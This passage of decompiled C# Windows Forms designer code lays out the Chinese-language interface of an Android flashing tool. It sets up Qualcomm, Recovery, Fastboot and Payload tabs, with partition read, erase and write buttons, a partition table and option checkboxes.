		((Control)this.m_108).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_108).Location = new Point(3, 470);
		((Control)this.m_108).Name = "checkBox3";
		((Control)this.m_108).Size = new Size(77, 32);
		((Control)this.m_108).TabIndex = 58;
		((Control)this.m_108).Text = "自动重启";
		((Alert)this.m_10c).BorderWidth = 2f;
		((Control)this.m_10c).Font = new Font("Microsoft YaHei UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Alert)this.m_10c).Icon = (TType)2;
		((Control)this.m_10c).Location = new Point(371, 9);
		((Control)this.m_10c).Name = "alert7";
		((Control)this.m_10c).Size = new Size(104, 23);
		((Control)this.m_10c).TabIndex = 47;
		((Control)this.m_10c).Text = "REC操作区域";
		((Control)this.m_10f).Controls.Add((Control)this.m_115);
		((Control)this.m_10f).Controls.Add((Control)this.m_110);
		((Control)this.m_10f).Controls.Add((Control)this.m_111);
		((Control)this.m_10f).Enabled = false;
		((Control)this.m_10f).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_10f).ForeColor = Color.DodgerBlue;
		((Control)this.m_10f).Location = new Point(9, 3);
		((Control)this.m_10f).Name = "groupBox15";
		((Control)this.m_10f).Size = new Size(465, 534);
		((Control)this.m_10f).TabIndex = 34;
		((GroupBox)this.m_10f).TabStop = false;
		((Control)this.m_10f).Text = "分区表";
		((Control)this.m_115).Controls.Add((Control)this.m_122);
		((Control)this.m_115).Controls.Add((Control)this.m_121);
		((Control)this.m_115).Controls.Add((Control)this.m_11f);
		((Control)this.m_115).Controls.Add((Control)this.m_120);
		((Control)this.m_115).Controls.Add((Control)_11e);
		((Control)this.m_115).Controls.Add((Control)this.m_11b);
		((Control)this.m_115).Controls.Add((Control)this.m_11c);
		((Control)this.m_115).Controls.Add((Control)this.m_11d);
		((Control)this.m_115).Controls.Add((Control)this.m_116);
		((Control)this.m_115).Controls.Add((Control)this.m_117);
		((Control)this.m_115).Controls.Add((Control)this.m_118);
		((Control)this.m_115).Controls.Add((Control)this.m_119);
		((Control)this.m_115).Controls.Add((Control)this.m_11a);
		((Control)this.m_115).ForeColor = Color.LightSkyBlue;
		((Control)this.m_115).Location = new Point(8, 355);
		((Control)this.m_115).Name = "groupBox16";
		((Control)this.m_115).Size = new Size(443, 168);
		((Control)this.m_115).TabIndex = 40;
		((GroupBox)this.m_115).TabStop = false;
		((Control)this.m_115).Text = "操作";
		((Control)this.m_115).Enter += _143;
		((Checkbox)this.m_122).AutoCheck = true;
		((Control)this.m_122).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_122).Location = new Point(286, 54);
		((Control)this.m_122).Name = "checkbox14";
		((Control)this.m_122).Size = new Size(81, 32);
		((Control)this.m_122).TabIndex = 64;
		((Control)this.m_122).Text = "DM验证";
		((Checkbox)this.m_122).CheckedChanged += _153;
		((Checkbox)this.m_121).AutoCheck = true;
		((Control)this.m_121).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_121).Location = new Point(208, 53);
		((Control)this.m_121).Name = "checkbox13";
		((Control)this.m_121).Size = new Size(79, 32);
		((Control)this.m_121).TabIndex = 63;
		((Control)this.m_121).Text = "跳过CRC";
		((Checkbox)this.m_121).CheckedChanged += _156;
		((Checkbox)this.m_11f).AutoCheck = true;
		((Control)this.m_11f).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_11f).Location = new Point(363, 55);
		((Control)this.m_11f).Name = "checkbox12";
		((Control)this.m_11f).Size = new Size(69, 32);
		((Control)this.m_11f).TabIndex = 62;
		((Control)this.m_11f).Text = "锁定BL";
		((Checkbox)this.m_11f).CheckedChanged += _157;
		((Checkbox)this.m_120).AutoCheck = true;
		((Control)this.m_120).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_120).Location = new Point(138, 53);
		((Control)this.m_120).Name = "checkbox11";
		((Control)this.m_120).Size = new Size(67, 32);
		((Control)this.m_120).TabIndex = 61;
		((Control)this.m_120).Text = "保数据";
		((Checkbox)this.m_120).CheckedChanged += _14c;
		((Checkbox)_11e).AutoCheck = true;
		((Control)_11e).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)_11e).Location = new Point(61, 53);
		((Control)_11e).Name = "checkbox10";
		((Control)_11e).Size = new Size(80, 32);
		((Control)_11e).TabIndex = 60;
		((Control)_11e).Text = "切换A槽";
		((Checkbox)_11e).CheckedChanged += _14d;
		((Checkbox)this.m_11b).AutoCheck = true;
		((Control)this.m_11b).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_11b).Location = new Point(6, 52);
		((Control)this.m_11b).Name = "checkbox9";
		((Control)this.m_11b).Size = new Size(61, 32);
		((Control)this.m_11b).TabIndex = 59;
		((Control)this.m_11b).Text = "重启";
		((Checkbox)this.m_11b).CheckedChanged += _142;
		((Control)this.m_11c).Cursor = Cursors.IBeam;
		((Control)this.m_11c).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_11c).Location = new Point(7, 24);
		((Control)this.m_11c).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_11c).MinimumSize = new Size(1, 16);
		((Control)this.m_11c).Name = "uiTextBox5";
		((Control)this.m_11c).Padding = new Padding(5);
		((UIUserControl)this.m_11c).RectColor = Color.Silver;
		((UIPanel)this.m_11c).ShowText = false;
		((Control)this.m_11c).Size = new Size(311, 23);
		((Control)this.m_11c).TabIndex = 45;
		((UIUserControl)this.m_11c).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_11c).Watermark = "Flash bat";
		((UITextBox)this.m_11c).TextChanged += _144;
		((Control)this.m_11d).Cursor = Cursors.Hand;
		((UIButton)this.m_11d).FillColor = Color.LightSkyBlue;
		((Control)this.m_11d).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_11d).Location = new Point(324, 24);
		((Control)this.m_11d).MinimumSize = new Size(1, 1);
		((Control)this.m_11d).Name = "uiSymbolButton7";
		((UIControl)this.m_11d).Radius = 8;
		((UIButton)this.m_11d).RectColor = Color.LightSkyBlue;
		((Control)this.m_11d).Size = new Size(107, 23);
		((UISymbolButton)this.m_11d).Symbol = 61563;
		((UISymbolButton)this.m_11d).SymbolSize = 20;
		((Control)this.m_11d).TabIndex = 46;
		((Control)this.m_11d).Text = "选择";
		((UIButton)this.m_11d).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_11d).Click += _14b;
		((Control)this.m_116).Font = new Font("Microsoft YaHei UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Tag)this.m_116).Image = (Image)componentResourceManager.GetObject("tag1.Image");
		((Control)this.m_116).Location = new Point(6, 90);
		((Control)this.m_116).Name = "tag1";
		((Control)this.m_116).Size = new Size(312, 28);
		((Control)this.m_116).TabIndex = 44;
		((Control)this.m_116).Text = "FastBoot操作区域";
		((Control)this.m_117).Cursor = Cursors.Hand;
		((UIButton)this.m_117).FillColor = Color.LightSkyBlue;
		((Control)this.m_117).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_117).Location = new Point(6, 124);
		((Control)this.m_117).MinimumSize = new Size(1, 1);
		((Control)this.m_117).Name = "uiSymbolButton6";
		((UIButton)this.m_117).RectColor = Color.LightSkyBlue;
		((Control)this.m_117).Size = new Size(135, 32);
		((UISymbolButton)this.m_117).Symbol = 61639;
		((UISymbolButton)this.m_117).SymbolSize = 20;
		((Control)this.m_117).TabIndex = 43;
		((Control)this.m_117).Text = "读分区表";
		((UIButton)this.m_117).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_117).Click += _146;
		((Control)this.m_118).Cursor = Cursors.Hand;
		((UIButton)this.m_118).FillColor = Color.LightSkyBlue;
		((Control)this.m_118).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_118).Location = new Point(147, 124);
		((Control)this.m_118).MinimumSize = new Size(1, 1);
		((Control)this.m_118).Name = "uiSymbolButton8";
		((UIButton)this.m_118).RectColor = Color.LightSkyBlue;
		((Control)this.m_118).Size = new Size(133, 32);
		((UISymbolButton)this.m_118).Symbol = 361741;
		((UISymbolButton)this.m_118).SymbolSize = 20;
		((Control)this.m_118).TabIndex = 41;
		((Control)this.m_118).Text = "擦除分区";
		((UIButton)this.m_118).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_118).Click += _141;
		((Control)this.m_119).Cursor = Cursors.Hand;
		((UIButton)this.m_119).FillColor = Color.LightSkyBlue;
		((Control)this.m_119).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_119).Location = new Point(286, 124);
		((Control)this.m_119).MinimumSize = new Size(1, 1);
		((Control)this.m_119).Name = "uiSymbolButton9";
		((UIButton)this.m_119).RectColor = Color.LightSkyBlue;
		((Control)this.m_119).Size = new Size(146, 32);
		((UISymbolButton)this.m_119).Symbol = 357527;
		((UISymbolButton)this.m_119).SymbolSize = 20;
		((Control)this.m_119).TabIndex = 40;
		((Control)this.m_119).Text = "写入分区";
		((UIButton)this.m_119).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_119).Click += _14e;
		((UIComboBox)this.m_11a).DataSource = null;
		((UIUserControl)this.m_11a).FillColor = Color.White;
		((UIUserControl)this.m_11a).FillColorGradientDirection = FlowDirection.LeftToRight;
		((Control)this.m_11a).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((UIComboBox)this.m_11a).ItemHoverColor = Color.FromArgb(155, 200, 255);
		((UIComboBox)this.m_11a).ItemSelectForeColor = Color.FromArgb(235, 243, 255);
		((Control)this.m_11a).Location = new Point(324, 93);
		((Control)this.m_11a).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_11a).MinimumSize = new Size(63, 0);
		((Control)this.m_11a).Name = "uiComboBox4";
		((Control)this.m_11a).Padding = new Padding(0, 0, 30, 2);
		((UIUserControl)this.m_11a).RectColor = Color.Silver;
		((UIComboBox)this.m_11a).ScrollBarColor = Color.Green;
		((UIComboBox)this.m_11a).ScrollBarStyleInherited = false;
		((Control)this.m_11a).Size = new Size(108, 23);
		((UIDropControl)this.m_11a).SymbolSize = 24;
		((Control)this.m_11a).TabIndex = 37;
		((UIUserControl)this.m_11a).TextAlignment = ContentAlignment.MiddleLeft;
		((UIDropControl)this.m_11a).Watermark = "查找分区";
		((UIComboBox)this.m_11a).TextChanged += _15b;
		((UIComboBox)this.m_11a).SelectedIndexChanged += _15c;
		((UIDropControl)this.m_11a).KeyDown += _15d;
		((Control)this.m_110).AutoSize = true;
		((Control)this.m_110).BackColor = Color.White;
		((Control)this.m_110).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_110).ForeColor = Color.Cyan;
		((Control)this.m_110).Location = new Point(12, 25);
		((Control)this.m_110).Name = "checkBox8";
		((Control)this.m_110).Size = new Size(15, 14);
		((Control)this.m_110).TabIndex = 32;
		((ButtonBase)this.m_110).UseVisualStyleBackColor = false;
		((CheckBox)this.m_110).CheckedChanged += _152;
		((ListView)this.m_111).BorderStyle = BorderStyle.None;
		((ListView)this.m_111).CheckBoxes = true;
		((ListView)this.m_111).Columns.AddRange(new ColumnHeader[5]
		{
			(ColumnHeader)this.m_112,
			(ColumnHeader)this.m_113,
			(ColumnHeader)this.m_114,
			(ColumnHeader)this.m_14d,
			(ColumnHeader)this.m_16c
		});
		((Control)this.m_111).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_111).ForeColor = SystemColors.MenuHighlight;
		((ListView)this.m_111).FullRowSelect = true;
		((ListView)this.m_111).HideSelection = false;
		((Control)this.m_111).Location = new Point(7, 21);
		((Control)this.m_111).Name = "listView3";
		((Control)this.m_111).Size = new Size(444, 324);
		((Control)this.m_111).TabIndex = 11;
		((ListView)this.m_111).UseCompatibleStateImageBehavior = false;
		((ListView)this.m_111).View = View.Details;
		((ListView)this.m_111).ItemCheck += _155;
		((Control)this.m_111).DoubleClick += _15a;
		((ColumnHeader)this.m_112).Text = "         Partition";
		((ColumnHeader)this.m_112).Width = 141;
		((ColumnHeader)this.m_113).Text = "        File";
		((ColumnHeader)this.m_113).Width = 133;
		((ColumnHeader)this.m_114).Text = "    File Path";
		((ColumnHeader)this.m_114).Width = 563;
		((ColumnHeader)this.m_14d).Text = "操作";
		((ColumnHeader)this.m_14d).Width = 0;
		((ColumnHeader)this.m_16c).Text = "LUN";
		((System.Windows.Forms.Timer)this.m_125).Enabled = true;
		((System.Windows.Forms.Timer)this.m_125).Interval = 20000;
		((System.Windows.Forms.Timer)this.m_125).Tick += _12c;
		((Control)this.m_127).Cursor = Cursors.Hand;
		((Control)this.m_127).Font = new Font("微软雅黑", 12f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Tabs)this.m_127).Gap = 12;
		((Control)this.m_127).Location = new Point(3, 57);
		((Control)this.m_127).MaximumSize = new Size(483, 580);
		((Control)this.m_127).MinimumSize = new Size(483, 580);
		((Control)this.m_127).Name = "tabs1";
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_127).Pages).Add((AntdUI.TabPage)this.m_128);
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_127).Pages).Add((AntdUI.TabPage)this.m_129);
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_127).Pages).Add((AntdUI.TabPage)this.m_12a);
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_127).Pages).Add((AntdUI.TabPage)this.m_12f);
		((iCollection<AntdUI.TabPage>)(object)((Tabs)this.m_127).Pages).Add((AntdUI.TabPage)this.m_12b);
		((Control)this.m_127).Size = new Size(483, 580);
		((Tabs)this.m_127).Style = (IStyle)(object)style;
		((Control)this.m_127).TabIndex = 59;
		((Control)this.m_127).Text = "tabs1";
		((Control)this.m_128).Controls.Add((Control)this.m_142);
		((Control)this.m_128).Controls.Add((Control)this.m_12d);
		((Control)this.m_128).Controls.Add((Control)this.m_12c);
		((Control)this.m_128).Controls.Add((Control)this.m_c5);
		((Control)this.m_128).Controls.Add((Control)this.m_e9);
		((Control)this.m_128).Controls.Add((Control)this.m_ec);
		((Control)this.m_128).Controls.Add((Control)this.m_91);
		((Control)this.m_128).Controls.Add((Control)this.m_ed);
		((Control)this.m_128).Controls.Add((Control)this.m_90);
		((Control)this.m_128).Controls.Add((Control)this.m_c2);
		((Control)this.m_128).Controls.Add((Control)this.m_108);
		((Control)this.m_128).Controls.Add((Control)this.m_c3);
		((Control)this.m_128).Controls.Add((Control)_88);
		((Control)this.m_128).Controls.Add((Control)this.m_89);
		((Control)this.m_128).Controls.Add((Control)this.m_109);
		((Control)this.m_128).Controls.Add((Control)this.m_10a);
		((Control)this.m_128).Dock = DockStyle.Fill;
		((Control)this.m_128).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((AntdUI.TabPage)this.m_128).IconSvg = "";
		((Control)this.m_128).Location = new Point(3, 39);
		((Control)this.m_128).Name = "tabPage14";
		((Control)this.m_128).Size = new Size(477, 538);
		((Control)this.m_128).TabIndex = 58;
		((Control)this.m_128).Text = "高通";
		((Checkbox)this.m_142).AutoCheck = true;
		((Control)this.m_142).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_142).Location = new Point(221, 471);
		((Control)this.m_142).Name = "readFH";
		((Control)this.m_142).Size = new Size(76, 32);
		((Control)this.m_142).TabIndex = 66;
		((Control)this.m_142).Text = "兼容模式";
		((Checkbox)this.m_142).CheckedChanged += _185;
		((Checkbox)this.m_12d).AutoCheck = true;
		((Control)this.m_12d).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_12d).Location = new Point(294, 471);
		((Control)this.m_12d).Name = "checkbox5";
		((Control)this.m_12d).Size = new Size(86, 32);
		((Control)this.m_12d).TabIndex = 65;
		((Control)this.m_12d).Text = "保护LUN5";
		((Checkbox)this.m_12d).CheckedChanged += _165;
		((Checkbox)this.m_12c).AutoCheck = true;
		((Control)this.m_12c).Font = new Font("Microsoft YaHei UI", 9f);
		((Control)this.m_12c).Location = new Point(156, 471);
		((Control)this.m_12c).Name = "checkbox18";
		((Control)this.m_12c).Size = new Size(68, 32);
		((Control)this.m_12c).TabIndex = 64;
		((Control)this.m_12c).Text = "保数据";
		((Checkbox)this.m_12c).CheckedChanged += _164;
		((Control)this.m_129).Controls.Add((Control)this.m_10c);
		((Control)this.m_129).Controls.Add((Control)this.m_ee);
		((Control)this.m_129).Controls.Add((Control)this.m_fa);
		((Control)this.m_129).Controls.Add((Control)this.m_ea);
		((Control)this.m_129).Controls.Add((Control)this.m_d7);
		((Control)this.m_129).Controls.Add((Control)this.m_ef);
		((Control)this.m_129).Controls.Add((Control)this.m_f8);
		((Control)this.m_129).Controls.Add((Control)this.m_d5);
		((Control)this.m_129).Dock = DockStyle.Fill;
		((Control)this.m_129).Font = new Font("微软雅黑", 9f);
		((Control)this.m_129).Location = new Point(3, 39);
		((Control)this.m_129).Name = "tabPage15";
		((Control)this.m_129).Size = new Size(477, 538);
		((Control)this.m_129).TabIndex = 0;
		((Control)this.m_129).Text = "Recovery";
		((Control)this.m_12a).Controls.Add((Control)this.m_10f);
		((Control)this.m_12a).Dock = DockStyle.Fill;
		((Control)this.m_12a).Font = new Font("微软雅黑", 9f);
		((Control)this.m_12a).Location = new Point(3, 39);
		((Control)this.m_12a).Name = "Fastboot";
		((Control)this.m_12a).Size = new Size(477, 538);
		((Control)this.m_12a).TabIndex = 0;
		((Control)this.m_12a).Text = "Fastboot";
		((Control)this.m_12f).Controls.Add((Control)this.m_176);
		((Control)this.m_12f).Controls.Add((Control)this.m_137);
		((Control)this.m_12f).Controls.Add((Control)this.m_136);
		((Control)this.m_12f).Dock = DockStyle.Fill;
		((Control)this.m_12f).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_12f).Location = new Point(3, 39);
		((Control)this.m_12f).Name = "tabPage1";
		((Control)this.m_12f).Size = new Size(477, 538);
		((Control)this.m_12f).TabIndex = 0;
		((Control)this.m_12f).Text = "Payload";
		((Control)this.m_176).Controls.Add((Control)this.m_173);
		((Control)this.m_176).Controls.Add((Control)this.m_16e);
		((Control)this.m_176).ForeColor = Color.DodgerBlue;
		((Control)this.m_176).Location = new Point(10, 87);
		((Control)this.m_176).Name = "groupBox14";
		((Control)this.m_176).Size = new Size(461, 364);
		((Control)this.m_176).TabIndex = 59;
		((GroupBox)this.m_176).TabStop = false;
		((Control)this.m_176).Text = "分区表";
		((Control)this.m_173).AutoSize = true;
		((Control)this.m_173).BackColor = Color.White;
		((Control)this.m_173).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_173).ForeColor = Color.Cyan;
		((Control)this.m_173).Location = new Point(12, 22);
		((Control)this.m_173).Name = "checkBox17";
		((Control)this.m_173).Size = new Size(15, 14);
		((Control)this.m_173).TabIndex = 58;
		((ButtonBase)this.m_173).UseVisualStyleBackColor = false;
		((CheckBox)this.m_173).CheckedChanged += _1a8;
		((DataGridView)this.m_16e).AllowUserToAddRows = false;
		((DataGridView)this.m_16e).AllowUserToDeleteRows = false;
		((DataGridView)this.m_16e).BackgroundColor = Color.White;
		((DataGridView)this.m_16e).BorderStyle = BorderStyle.None;
		((DataGridView)this.m_16e).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		((DataGridView)this.m_16e).Columns.AddRange((DataGridViewColumn)this.m_16f, (DataGridViewColumn)this.m_170, (DataGridViewColumn)this.m_171, (DataGridViewColumn)this.m_172);
		((Control)this.m_16e).Location = new Point(6, 17);
		((Control)this.m_16e).Name = "dataGridView2";
		((DataGridView)this.m_16e).RowHeadersVisible = false;
		((DataGridView)this.m_16e).RowTemplate.Height = 23;
		((Control)this.m_16e).Size = new Size(449, 341);
		((Control)this.m_16e).TabIndex = 57;
		((DataGridView)this.m_16e).CellContentClick += _1a9;
		((DataGridView)this.m_16e).CellMouseDoubleClick += _1ab;
		((Control)this.m_16e).DoubleClick += _1aa;
		((DataGridViewColumn)this.m_16f).HeaderText = "";
		((DataGridViewColumn)this.m_16f).Name = "checke";
		((DataGridViewBand)this.m_16f).Resizable = DataGridViewTriState.False;
		((DataGridViewColumn)this.m_16f).Width = 25;
		((DataGridViewColumn)this.m_170).HeaderText = "Partition";
		((DataGridViewColumn)this.m_170).Name = "Pname";
		((DataGridViewBand)this.m_170).ReadOnly = true;
		((DataGridViewColumn)this.m_171).HeaderText = "Size";
		((DataGridViewColumn)this.m_171).Name = "Sizestar";
		((DataGridViewBand)this.m_171).ReadOnly = true;
		((DataGridViewColumn)this.m_171).Width = 80;
		((DataGridViewColumn)this.m_172).HeaderText = "FilePath";
		((DataGridViewColumn)this.m_172).Name = "pathfile";
		((DataGridViewBand)this.m_172).ReadOnly = true;
		((DataGridViewColumn)this.m_172).Width = 300;
		((Control)this.m_137).Controls.Add((Control)this.m_138);
		((Control)this.m_137).Controls.Add((Control)this.m_133);
		((Control)this.m_137).Controls.Add((Control)this.m_134);
		((Control)this.m_137).Controls.Add((Control)this.m_135);
		((Control)this.m_137).Location = new Point(10, 5);
		((Control)this.m_137).Name = "groupBox17";
		((Control)this.m_137).Size = new Size(461, 78);
		((Control)this.m_137).TabIndex = 48;
		((GroupBox)this.m_137).TabStop = false;
		((Control)this.m_137).Text = "File";
		((Control)this.m_138).Font = new Font("Microsoft YaHei UI", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_138).Location = new Point(386, 16);
		((Control)this.m_138).Name = "label4";
		((Control)this.m_138).Size = new Size(69, 23);
		((Control)this.m_138).TabIndex = 43;
		((Control)this.m_138).Text = "线程核心";
		((Control)this.m_133).Cursor = Cursors.IBeam;
		((Control)this.m_133).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_133).Location = new Point(10, 49);
		((Control)this.m_133).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_133).MinimumSize = new Size(1, 16);
		((Control)this.m_133).Name = "imgPath";
		((Control)this.m_133).Padding = new Padding(5);
		((UIUserControl)this.m_133).RectColor = Color.Silver;
		((UIPanel)this.m_133).ShowText = false;
		((Control)this.m_133).Size = new Size(369, 23);
		((Control)this.m_133).TabIndex = 45;
		((UIUserControl)this.m_133).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_133).Watermark = "双击来选择镜像输出与刷写路径文件夹";
		((UITextBox)this.m_133).DoubleClick += _16c;
		((Select)this.m_134).Items.AddRange(new object[5] { "自动", "32", "16", "8", "4" });
		((Select)this.m_134).List = true;
		((Control)this.m_134).Location = new Point(378, 46);
		((Control)this.m_134).Name = "select1";
		((Control)this.m_134).Size = new Size(77, 29);
		((Control)this.m_134).TabIndex = 44;
		((Control)this.m_135).Cursor = Cursors.IBeam;
		((Control)this.m_135).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_135).Location = new Point(10, 17);
		((Control)this.m_135).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_135).MinimumSize = new Size(1, 16);
		((Control)this.m_135).Name = "binPath";
		((Control)this.m_135).Padding = new Padding(5);
		((UIUserControl)this.m_135).RectColor = Color.Silver;
		((UIPanel)this.m_135).ShowText = false;
		((Control)this.m_135).Size = new Size(369, 23);
		((Control)this.m_135).TabIndex = 43;
		((UIUserControl)this.m_135).TextAlignment = ContentAlignment.MiddleLeft;
		((UITextBox)this.m_135).Watermark = "双击选择Payload.bin 或关闭Payload";
		((UITextBox)this.m_135).DoubleClick += _168;
		((Control)this.m_136).Controls.Add((Control)this.m_175);
		((Control)this.m_136).Controls.Add((Control)this.m_174);
		((Control)this.m_136).Controls.Add((Control)this.m_16d);
		((Control)this.m_136).Controls.Add((Control)this.m_13a);
		((Control)this.m_136).Controls.Add((Control)this.m_13b);
		((Control)this.m_136).Controls.Add((Control)this.m_139);
		((Control)this.m_136).Controls.Add((Control)this.m_131);
		((Control)this.m_136).Controls.Add((Control)this.m_132);
		((Control)this.m_136).Controls.Add((Control)this.m_130);
		((UIUserControl)this.m_136).FillColor = Color.White;
		((Control)this.m_136).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_136).Location = new Point(11, 458);
		((Control)this.m_136).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_136).MinimumSize = new Size(1, 1);
		((Control)this.m_136).Name = "uiPanel2";
		((UIUserControl)this.m_136).RectColor = Color.LightSkyBlue;
		((Control)this.m_136).Size = new Size(462, 80);
		((Control)this.m_136).TabIndex = 46;
		((Control)this.m_136).Text = null;
		((UIUserControl)this.m_136).TextAlignment = ContentAlignment.MiddleCenter;
		((Control)this.m_175).Cursor = Cursors.Hand;
		((UIButton)this.m_175).FillColor = Color.LightSkyBlue;
		((Control)this.m_175).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_175).Location = new Point(11, 42);
		((Control)this.m_175).MinimumSize = new Size(1, 1);
		((Control)this.m_175).Name = "uiSymbolButton14";
		((UIButton)this.m_175).RectColor = Color.LightSkyBlue;
		((Control)this.m_175).Size = new Size(97, 32);
		((UISymbolButton)this.m_175).Symbol = 161819;
		((UISymbolButton)this.m_175).SymbolSize = 20;
		((Control)this.m_175).TabIndex = 53;
		((Control)this.m_175).Text = "修复FBD";
		((UIButton)this.m_175).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_175).Click += _17d;
		((Control)this.m_174).BackColor = Color.White;
		((Control)this.m_174).Cursor = Cursors.IBeam;
		((ComboBox)this.m_174).FlatStyle = FlatStyle.Flat;
		((Control)this.m_174).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_174).ForeColor = Color.Gray;
		((ListControl)this.m_174).FormattingEnabled = true;
		((Control)this.m_174).Location = new Point(356, 45);
		((Control)this.m_174).Name = "comboBox3";
		((Control)this.m_174).Size = new Size(93, 25);
		((Control)this.m_174).TabIndex = 52;
		((Control)this.m_174).Text = "查找单分区";
		((ComboBox)this.m_174).SelectionChangeCommitted += _1ae;
		((Control)this.m_174).TextChanged += _1af;
		((Control)this.m_174).Enter += _1ac;
		((Control)this.m_174).KeyDown += _1ad;
		((Control)this.m_174).Leave += _1b0;
		((Checkbox)this.m_16d).AutoCheck = true;
		((Control)this.m_16d).Location = new Point(344, 7);
		((Control)this.m_16d).Name = "SHa256Che";
		((Control)this.m_16d).Size = new Size(110, 25);
		((Control)this.m_16d).TabIndex = 51;
		((Control)this.m_16d).Text = "校验Sha256";
		((Checkbox)this.m_13a).AutoCheck = true;
		((Control)this.m_13a).Location = new Point(260, 7);
		((Control)this.m_13a).Name = "paylodA";
		((Control)this.m_13a).Size = new Size(95, 25);
		((Control)this.m_13a).TabIndex = 49;
		((Control)this.m_13a).Text = "切换A分区";
		((Checkbox)this.m_13b).AutoCheck = true;
		((Control)this.m_13b).Location = new Point(183, 7);
		((Control)this.m_13b).Name = "paylodFrp";
		((Control)this.m_13b).Size = new Size(81, 25);
		((Control)this.m_13b).TabIndex = 48;
		((Control)this.m_13b).Text = "擦除FRp";
		((Checkbox)this.m_139).AutoCheck = true;
		((Control)this.m_139).Location = new Point(9, 7);
		((Control)this.m_139).Name = "paylodreboot";
		((Control)this.m_139).Size = new Size(81, 25);
		((Control)this.m_139).TabIndex = 47;
		((Control)this.m_139).Text = "自动重启";
		((Control)this.m_131).Cursor = Cursors.Hand;
		((UIButton)this.m_131).FillColor = Color.LightSkyBlue;
		((Control)this.m_131).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_131).Location = new Point(114, 42);
		((Control)this.m_131).MinimumSize = new Size(1, 1);
		((Control)this.m_131).Name = "uiSymbolButton11";
		((UIButton)this.m_131).RectColor = Color.LightSkyBlue;
		((Control)this.m_131).Size = new Size(106, 32);
		((UISymbolButton)this.m_131).Symbol = 61717;
		((UISymbolButton)this.m_131).SymbolSize = 20;
		((Control)this.m_131).TabIndex = 42;
		((Control)this.m_131).Text = "提取Bin分区";
		((UIButton)this.m_131).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_131).Click += _178;
		((Control)this.m_132).Cursor = Cursors.Hand;
		((UIButton)this.m_132).FillColor = Color.LightSkyBlue;
		((Control)this.m_132).Font = new Font("微软雅黑 Light", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_132).Location = new Point(226, 42);
		((Control)this.m_132).MinimumSize = new Size(1, 1);
		((Control)this.m_132).Name = "FLashimg";
		((UIButton)this.m_132).RectColor = Color.LightSkyBlue;
		((Control)this.m_132).Size = new Size(105, 32);
		((UISymbolButton)this.m_132).Symbol = 357527;
		((UISymbolButton)this.m_132).SymbolSize = 20;
		((Control)this.m_132).TabIndex = 41;
		((Control)this.m_132).Text = "写入分区";
		((UIButton)this.m_132).TipsFont = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_132).Click += _177;
		((Checkbox)this.m_130).AutoCheck = true;
